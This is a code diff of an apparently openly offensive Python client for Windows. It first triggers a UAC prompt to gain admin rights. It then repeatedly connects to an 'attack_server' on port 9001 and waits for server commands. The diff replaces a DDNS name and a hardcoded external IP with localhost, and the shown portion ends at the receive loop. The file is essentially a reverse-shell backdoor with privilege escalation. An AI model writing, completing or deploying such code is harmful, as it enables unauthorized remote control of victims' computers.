@@ -1,18 +1,7 @@
 import os,socket,subprocess
 import time,sys
 import win32com.shell.shell as shell
-import argparse
 
-### argparser
-parser = argparse.ArgumentParser()
-parser.add_argument("--port","-p",dest="host_port",help="host's port number",type=int,)
-
-args = parser.parse_args()
-if(args.host_port==None):
-    print("no host port input error...")
-else:
-    #print(f"{args.host_port}")
-    pass
 
 ### UAC to get Admins
 print("UAC start...")
@@ -29,20 +18,16 @@ subprocess.call(script,shell=True) #다른프로세스로 실행되기때문에,
 #### payload
 
 
-
 port = 9001 #port of attack_server
+#host_addr = "175.192.214.36" #address of attack_server
+host_addr = "localhost" 
 print("client start...")
 
 while True:
     try:
-        ddns_addr="george.iptime.org"
-        #host = "localhost" #address of attack_server
-        host = socket.gethostbyname(ddns_addr)
-        print(host)
-        host = "175.192.214.36"
         with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-            s.connect((host, port))
-            print("connected to",host,port)
+            s.connect((host_addr, port))
+            print("connected to",host_addr,port)
             while True:
                 print("wait for server message...")
                 data = s.recv(10000).decode()
